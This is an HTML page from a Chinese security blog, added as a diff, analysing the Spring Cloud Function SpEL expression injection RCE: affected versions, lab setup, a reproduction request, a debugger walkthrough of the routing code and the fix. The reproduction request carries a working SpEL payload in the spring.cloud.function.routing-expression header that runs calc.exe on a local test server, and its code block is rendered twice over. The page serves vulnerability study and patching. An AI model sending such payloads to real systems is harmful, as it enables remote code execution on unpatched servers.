@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>SpringCloud Function SPEL RCE analysis - S0cke3t&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="SpringCloud Function SPEL表达式 RCE 漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SpringCloud Function SPEL RCE analysis">
+<meta property="og:url" content="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html">
+<meta property="og:site_name" content="S0cke3t&#39;s Blog">
+<meta property="og:description" content="SpringCloud Function SPEL表达式 RCE 漏洞分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291252633.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291257431.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291259230.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291407572.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291309615.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291341310.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291343055.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291345377.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291348933.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291352844.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291356623.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291400948.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291406532.png">
+<meta property="article:published_time" content="2022-03-29T04:46:03.000Z">
+<meta property="article:modified_time" content="2022-03-31T13:18:00.000Z">
+<meta property="article:author" content="S0cke3t">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Spring">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291252633.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
+    <link rel="stylesheet" href="/css/style.css?v=1681132088674">
+     
+    
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1681132088674">
+    
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="mdui-drawer-body-left">
+    
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/newbolg/202203272236776.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="S0cke3t" class="mdui-btn mdui-btn-icon"><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        
+<meta name="keywords" content="渗透测试,CISP-PTE,代码审计,破解,移动安全,安全工具,漏洞利用">
+
+<div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="S0cke3t">
+            <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t" alt="S0cke3t">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>40</div>
+        <div><span>标签</span>28</div>
+        <div><span>分类</span>12</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/aboutme.html" title="关于我">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于我
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:saferoad.cc" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/DeEpinGh0st/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Analysis/">Analysis</a>
+          <span class="category-list-count">11</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Android/">Android</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Audit/">Audit</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Bypass/">Bypass</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CISP-PTE/">CISP-PTE</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Case-share/">Case share</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crack/">Crack</a>
+          <span class="category-list-count">3</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Deserialization/">Deserialization</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Docker/">Docker</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Emergency/">Emergency</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Notes/">Notes</a>
+          <span class="category-list-count">6</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Sectool/">Sectool</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ASP-NET/" style="font-size: 12.5px;">ASP.NET</a> <a href="/tags/Bypass/" style="font-size: 15px;">Bypass</a> <a href="/tags/Csharp/" style="font-size: 17.5px;">Csharp</a> <a href="/tags/Django/" style="font-size: 10px;">Django</a> <a href="/tags/Domain-security/" style="font-size: 10px;">Domain security</a> <a href="/tags/Flink/" style="font-size: 10px;">Flink</a> <a href="/tags/Frida/" style="font-size: 10px;">Frida</a> <a href="/tags/Hook/" style="font-size: 10px;">Hook</a> <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/KeyGen/" style="font-size: 10px;">KeyGen</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Nim/" style="font-size: 10px;">Nim</a> <a href="/tags/PHP/" style="font-size: 12.5px;">PHP</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Portainer/" style="font-size: 10px;">Portainer</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Reappearance/" style="font-size: 10px;">Reappearance</a> <a href="/tags/SecTool/" style="font-size: 10px;">SecTool</a> <a href="/tags/Seeyon/" style="font-size: 10px;">Seeyon</a> <a href="/tags/Spring/" style="font-size: 15px;">Spring</a> <a href="/tags/Sqlmap/" style="font-size: 10px;">Sqlmap</a> <a href="/tags/Struts2/" style="font-size: 10px;">Struts2</a> <a href="/tags/ThinkPHP/" style="font-size: 10px;">ThinkPHP</a> <a href="/tags/Windows/" style="font-size: 12.5px;">Windows</a> <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a> <a href="/tags/cuckoo/" style="font-size: 10px;">cuckoo</a> <a href="/tags/sandbox/" style="font-size: 10px;">sandbox</a> <a href="/tags/solution/" style="font-size: 10px;">solution</a>
+    </div>
+    
+  </div>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 S0cke3t
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br/>Too Young Too Sample
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
+              <img data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291415715.jpg" data-sizes="auto" alt="SpringCloud Function SPEL RCE analysis" class="lazyload">
+              <h1>SpringCloud Function SPEL RCE analysis</h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2022年03月29日</a>
+    <a><i class="nexmoefont icon-areachart"></i>728 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 3 分钟</a>
+</div>
+
+      
+
+      <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>近日，Spring Cloud Function 官方测试用例曝光了 Spring Cloud Function SPEL 表达式注入漏洞，可利用该漏洞通过注入 SPEL 表达式来触发远程命令执行。Spring Cloud Function 是一个基于 Spring Boot 的函数计算框架。通过抽象传输细节和基础设施，为开发者保留熟悉的开发工具和开发流程，让开发者专注于实现业务逻辑，从而提高开发效率。</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><blockquote>
+<p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p>
+</blockquote>
+<h4 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs plaintext"><code class="language-hljs plaintext">JDK: 17.0.2<br>IDEA 2021.3 x64<br>Windows 10 21H2 x64<br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+
+
+
+<p>使用github上 <a target="_blank" rel="noopener" href="https://github.com/cckuailong/spring-cloud-function-SpEL-RCE">cckuailong</a>师傅创建的环境</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291252633.png" alt="image-20220329125233391" class="lazyload"></p>
+<p>拉取仓库后用IDEA maven进行打包调试即可.由于spring默认端口使用的8080,所以可能会与Burpsuite冲突.可编辑<code>application.properties</code>修改默认端口</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291257431.png" alt="image-20220329125724382" class="lazyload"></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>待服务端启动后,向spring服务请求如下数据包</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre class="line-numbers language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/speltest</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation"><code class="language-hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/speltest</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8090<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br>spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("calc.exe")<br><br><br><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291259230.png" alt="image-20220329125946117" class="lazyload"></p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>首先来看一下官方提交的commit</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291407572.png" alt="image-20220329140718470" class="lazyload"></p>
+<p>根据官方commit, 可以得知该漏洞是由RoutingFunction功能所导致</p>
+<p>在commit中官方也给出了相应的测试用例</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291309615.png" alt="image-20220329130921569" class="lazyload"></p>
+<p>根据测试用例,可以得知漏洞触发点位于http header中<code>spring.cloud.function.routing-expression</code>字段</p>
+<p>首先,在所有路由的postmapping上打入断点,程序在进入到form后获取了当前的wapper,随后进入到processRequest</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291341310.png" alt="image-20220329134104253" class="lazyload"></p>
+<p>跟进</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291343055.png" alt="image-20220329134324974" class="lazyload"></p>
+<p>在processRequest中首先获取了当前wrapper的function,随后调用该function对象的apply</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291345377.png" alt="image-20220329134550327" class="lazyload"></p>
+<p>apply中紧接着调用了wrapper的doApply</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291348933.png" alt="image-20220329134800863" class="lazyload"></p>
+<p>doApply中首先判断wrapper是否是RoutingFunction,如果不是RoutingFunction则获取其target属性并调用其apply方法,而在此处当前wrapper的target属性正好是一个RoutingFunction</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291352844.png" alt="image-20220329135251776" class="lazyload"></p>
+<p>apply中直接调用了route方法,所以直接来看route</p>
+<p>在route中判断header头中是否有<code>spring.cloud.function.routing-expression</code>, 随后调用functionFromExpression</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291356623.png" alt="image-20220329135641580" class="lazyload"></p>
+<p>到functionFromExpression中,即调用Expression对传入的SPEL表达式进行解析,随后调用expression.getValue执行</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291400948.png" alt="image-20220329140001848" class="lazyload"></p>
+<h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>在修复版本中对header使用SimpleEvaluationContext进行安全处理</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2022/03/29/202203291406532.png" alt="image-20220329140402292" class="lazyload"></p>
+<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f">https://github.com/spring-cloud/spring-cloud-function/commit/0e89ee27b2e76138c16bcba6f4bca906c4f3744f</a></p>
+
+  </article>
+
+  
+      
+    <div class="nexmoe-post-copyright">
+        <strong>本文作者：</strong>S0cke3t<br>
+        <strong>本文链接：</strong><a href="https://www.saferoad.cc/Analysis/SpringCloud-Function-SPEL-RCE-analysis.html" title="https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;SpringCloud-Function-SPEL-RCE-analysis.html" target="_blank" rel="noopener">https:&#x2F;&#x2F;www.saferoad.cc&#x2F;Analysis&#x2F;SpringCloud-Function-SPEL-RCE-analysis.html</a><br>
+        
+            <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可
+        
+    </div>
+
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+    
+        <a class="nexmoefont icon-appstore-fill -link" href="/categories/Analysis/">Analysis</a>
+    
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Java/" rel="tag">Java</a> <a class="nexmoefont icon-tag-fill -none-link" href="/tags/Spring/" rel="tag">Spring</a>
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%9E%84%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">环境构建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">6.</span> <span class="toc-text">修复</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="回到顶部" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+     
+    <div id="nexmoe-search-space">
+        <div class="search-container">
+            <div class="search-header">
+                <div class="search-input-container">
+                    <input class="search-input" type="text" placeholder="搜索" oninput="sinput();">
+                </div>
+                <a class="search-close" onclick="sclose();">×</a>
+            </div>
+            <div class="search-body"></div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/combine/npm/lazysizes@5.1.0/lazysizes.min.js,npm/mdui@0.4.3/dist/js/mdui.min.js?v=1"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+ 
+
+<script async src="/js/app.js?v=1681132088676"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/js/jquery.justifiedGallery.min.js"></script>
+<script>
+	$(".justified-gallery").justifiedGallery({
+		rowHeight: 160,
+		margins: 10,
+	});
+</script>
+
+
+    
+
+
+
+
+
+</body>
+
+</html>
